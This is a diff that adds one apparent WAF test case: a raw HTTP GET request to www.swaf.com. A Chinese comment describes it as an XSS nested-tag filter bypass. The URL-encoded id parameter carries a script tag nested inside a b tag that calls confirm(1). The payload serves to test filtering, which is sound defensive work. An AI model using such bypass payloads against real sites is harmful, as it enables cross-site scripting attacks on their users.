@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_标签属性_数据混淆类(嵌套标签绕过)-06506807
+# 在b标签中嵌套script标签执行javascript代码中以欺骗过滤器。
+GET /?id=%3Cb%20%3Cscript%3Econfirm%281%29%2F%2F%3C%2Fscript%3E0%3C%2Fscript%3E%3C%2Fb%3E&bid=hd_tag_m8mv251w HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv251w
+RM-PRO-Token: e4b0826bce025f0456f586dde05b1bfa
+RM-PRO-Time: 1742808431142
+User-Agent: curl/7.83.1
+
